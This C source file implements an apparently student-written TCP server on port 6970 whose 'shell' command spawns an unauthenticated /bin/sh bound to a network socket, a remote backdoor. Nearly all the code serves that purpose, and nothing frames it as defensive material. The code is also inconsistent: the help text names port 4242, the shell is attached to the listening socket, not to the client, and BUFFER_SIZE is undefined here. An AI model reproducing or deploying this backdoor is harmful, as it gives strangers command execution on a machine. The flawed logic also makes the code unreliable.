#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include "libft.h"

#define DEBUG printf
#define MAX_CLIENTS 3
#define PORT 6970

#define HELP							\
"?		show help\n"					\
"shell	spawn remote shell on 4242\n"

char *clean_join(char *s1, char *s2) {
	char *tmp = ft_strjoin(s1, s2);
	free(s1);
	return tmp;
}

int init_socket(struct sockaddr_in *addr) {
	int sock = socket(PF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		DEBUG("socket does not work");
		return 0;
	}

	addr->sin_family = AF_INET;
	addr->sin_addr.s_addr = htonl(INADDR_ANY);
	addr->sin_port = htons(PORT);

	if (bind(sock, (struct sockaddr*)addr, sizeof(struct sockaddr)) < 0) {
		DEBUG("bind does not work");
		return 0;
	}

	if (listen(sock, MAX_CLIENTS) < 0) {
		DEBUG("listen does not work");
		return 0;
	}
	return sock;
}

bool new_connection(
	int sock, int epollfd, struct sockaddr_in *addr, struct epoll_event *ev) {
	socklen_t len = sizeof(struct sockaddr);
	int conn = accept(sock, (struct sockaddr*)addr, &len);
	if (conn < 0) {
		DEBUG("accept does not work");
		return false;
	}

	printf("New connection !\n");
	ev->events = EPOLLIN;
	ev->data.fd = conn;
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, conn, ev) < 0) {
		DEBUG("epoll_ctl does not work");
		return false;
	}

	return true;
}

void disconnect_client(int fd, int epollfd, struct epoll_event *ev) {
	printf("Client disconnected !\n");
	if (epoll_ctl(epollfd, EPOLL_CTL_DEL, fd, ev) < 0)
		DEBUG("epoll_ctl does not work");
	close(fd);
}

char *readline(int fd) {
	char *cmd = ft_strdup("");
	char buff[BUFFER_SIZE] = {};

	while (1) {
		int ret = recv(fd, buff, BUFFER_SIZE-1, MSG_DONTWAIT);
		if (ret == 0) {
			free(cmd);
			return NULL;
		} else if (ret > 0) {
			buff[ret] = 0;
			cmd = clean_join(cmd, buff);
		} else {
			if (errno == EAGAIN || errno == EWOULDBLOCK) {
				return cmd;
			}
			free(cmd);
			return NULL;
		}
	}

	return cmd;
}

void putstr(int fd, char *s) {
	send(fd, s, ft_strlen(s), 0);
}

bool sh(int fd) {
	int pid = fork();

	if (!pid) {
		dup2(fd, 0);
		dup2(fd, 1);
		dup2(fd, 2);
		execl("/bin/sh", "sh", (char *) NULL);
	}

	return true;
}

int main() {
	struct sockaddr_in addr = {};
	struct epoll_event ev, events[MAX_CLIENTS];

	bool shell = false;

	int sock = init_socket(&addr);
	if (!sock)
		return 0;

	int epollfd = epoll_create1(0);
	if (epollfd < 0) {
		DEBUG("epoll_create1 does not work");
		return 0;
	}

	ev.events = EPOLLIN;
	ev.data.fd = sock;

	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, &ev)) {
		DEBUG("epoll_ctl does not work");
		return 0;
	}

	while (true) {
		int nfds = epoll_wait(epollfd, events, MAX_CLIENTS, -1);
		if (nfds == -1) {
			DEBUG("epoll_wait does not work");
			return 0;
		}

		for (int n = 0; n < nfds; n++) {
			int fd = events[n].data.fd;
			if (fd == sock) {
				new_connection(sock, epollfd, &addr, &ev);

				if (shell) {
					shell = false;
					sh(fd);
				}
			} else {
				char *line = readline(fd);

				if (!line) {
					disconnect_client(fd, epollfd, &ev);
					continue;
				}

				if (!ft_strcmp(line, "shell\n")) {
					shell = true;
					disconnect_client(fd, epollfd, &ev);
				} else if (!ft_strcmp(line, "?\n")) {
					putstr(fd, HELP);
				}
			}
		}
	}

	close(sock);
}
